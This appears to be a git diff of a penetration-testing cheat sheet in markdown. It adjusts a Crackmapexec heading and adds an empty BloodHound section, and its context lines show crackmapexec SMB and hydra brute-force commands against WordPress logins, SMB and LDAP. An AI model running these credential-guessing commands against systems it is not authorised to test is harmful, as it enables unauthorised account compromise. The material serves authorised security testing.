@@ -1,4 +1,4 @@
-# Crackmapexec
+ # Crackmapexec
 ## With Password
 crackmapexec smb $ip -u '' -p '' --$Flags
 
@@ -38,4 +38,6 @@ hydra -l '' -p '' http://$ip_Or_domain/ http-post-form ":/"
 | hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
 | hydra -L usernames.txt -P passwords.txt $ip smb -V -f | SMB Brute Forcing |
 | hydra -L users.txt -P passwords.txt $ip ldap2 -V -f | LDAP Brute Forcing |
-  
+
+# BloodHound
+
